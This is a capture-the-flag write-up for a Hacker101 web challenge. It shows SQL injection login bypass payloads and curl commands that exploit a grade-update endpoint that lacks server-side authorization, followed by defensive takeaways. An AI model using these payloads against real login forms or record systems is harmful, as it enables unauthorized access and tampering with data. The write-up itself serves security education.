# OSU CTF

**Platform:** HackerOne CTF
**Challenge:** OSU CTF
**Difficulty:** Moderate
**Category:** Web
**Flags:** 1

---

## Overview

OSUSEC Student Management Portal is a web application where the goal is to change Natasha
Drew's grades to all A's. The login form is vulnerable to SQL injection, and the grade
update endpoint lacks server-side authorization — it only relies on client-side JavaScript
(`s.admin`) to hide the student update links.

**Hints provided:**
- "Always check the JS on the page for unlinked routes!"

**Server:** openresty/1.29.2.4

---

## Reconnaissance

### Application Behavior

The root `/` redirects (302) to `/login`, which presents a username/password login form.
A modal on the page describes the mission: Natasha Drew needs all A's to attend hacker camp.

After successful login, the user is redirected to a dashboard showing student records.
The page loads `app.min.js` which contains a `setupLinks()` function guarded by `s.admin`.

| Page/Endpoint | Method | Purpose |
|---------------|--------|---------|
| /login | GET/POST | Login form |
| /home | GET | Dashboard (after login) |
| /update-student/{id} | GET/POST | View/update student grades |

### Key Findings

1. **SQL Injection in login:** The login form's username and password parameters are
   directly interpolated into a SQL query without sanitization. The payload
   `admin' OR '1'='1` in both fields bypasses authentication.

2. **Client-side only admin check:** The dashboard loads a JavaScript variable `staff`
   with `staff.admin = false` for non-admin users. The `setupLinks()` function in
   `app.min.js` only adds click handlers to student names when `s.admin` is true,
   but the `/update-student/{id}` endpoint has **no server-side authorization**.

3. **Predictable student IDs:** The `{id}` parameter in `/update-student/{id}` is simply
   the student's `Firstname_Lastname` encoded in Base64. Changing the ID to
   `base64("Natasha_Drew")` = `TmF0YXNoYV9EcmV3` gives direct access to her grades.

---

## Flag 0 — SQL Injection + Missing Server-Side Authorization

**Method:** SQLi login → direct access to unguarded /update-student endpoint

### Vulnerability

The login form concatenates user input directly into a SQL query:

```sql
SELECT * FROM users WHERE username='{input}' AND password='{input}'
```

The `/update-student/{id}` endpoint performs **no server-side authorization check**.
The only protection is client-side JavaScript (`if (s.admin)`), which is trivially
bypassed by navigating directly to the URL.

### Exploit

```bash
# Step 1: SQL injection login
curl -c cookies.txt -X POST \
  -d "username=admin' OR '1'='1&password=admin' OR '1'='1" \
  https://<instance>.ctf.hacker101.com/login

# Step 2: Access Natasha's grade update page (Natasha_Drew → base64)
curl -b cookies.txt \
  https://<instance>.ctf.hacker101.com/update-student/TmF0YXNoYV9EcmV3

# Step 3: Update all grades to A
curl -b cookies.txt -X POST \
  -d "student_hash=<hash>&grade_english=A&grade_science=A&grade_maths=A" \
  https://<instance>.ctf.hacker101.com/update-student/TmF0YXNoYV9EcmV3
```

Response:

```html
<div class="alert alert-success text-center">
    <p>Awesome! Natasha has got top marks and can now attend Hacker Camp!!!!</p>
    <p><strong>^FLAG^<redacted>$FLAG$</strong></p>
</div>
```

> **Flag 0:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Never rely solely on client-side JavaScript for access control. Every
sensitive server endpoint must independently verify authorization. Client-side checks
can always be bypassed by navigating directly to the URL.

---

## Complete Flag List

| Flag | Hex | Technique |
|:----:|-----|-----------|
| 0 | `<redacted>` | SQL injection + missing server-side auth |

---

## Key Takeaways

1. **SQL injection is still everywhere:** Login forms are a prime target. Even simple
   `OR 1=1` payloads can bypass authentication when input is not parameterized.

2. **Client-side authorization is not authorization:** If the only check is
   `if (s.admin)` in JavaScript, the server endpoint is unprotected. Always test
   endpoints directly without client-side code.

3. **Predictable IDs enable IDOR:** When user identifiers are base64-encoded names
   (rather than random UUIDs), any valid user's data becomes trivially accessible.

4. **Check JS for hidden routes:** The `app.min.js` file revealed the
   `/update-student/{id}` endpoint structure, which was not linked from the UI
   for non-admin users. This is the "unlinked route" from the hint.

---

## Files

| File | Description |
|------|-------------|
| `solve.py` | Complete PoC — automates all flag captures |

## Usage

```bash
pip install requests
python3 solve.py https://<instance-id>.ctf.hacker101.com/
```

---

## References

- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [OSU CTF Writeup (AlliumSec)](https://alliumsec.com/osu-ctf/)
